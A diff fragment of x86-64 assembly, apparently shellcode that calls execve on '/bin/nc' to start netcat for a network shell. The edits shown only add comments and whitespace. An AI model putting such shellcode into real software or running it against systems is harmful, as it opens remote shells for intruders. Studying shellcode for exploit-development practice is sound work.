@@ -10,8 +10,8 @@ global _start:
 
 _start:
 
-	xor r14 , r14
-	add r14 , 0x36
+	xor r14 , r14 
+	add r14 , 0x36                    ; set for mul operation later
 	mov eax , eax
 	sub eax , eax
 	mov rdx , rax
@@ -66,7 +66,7 @@ _start:
 	push 	rdi  ;push address of '/bin/nc'
 
 	push rsp
-        pop rsi
+        pop rsi            ; set RSI
 	xor    rax , rax
 	add al , 59
         push r9
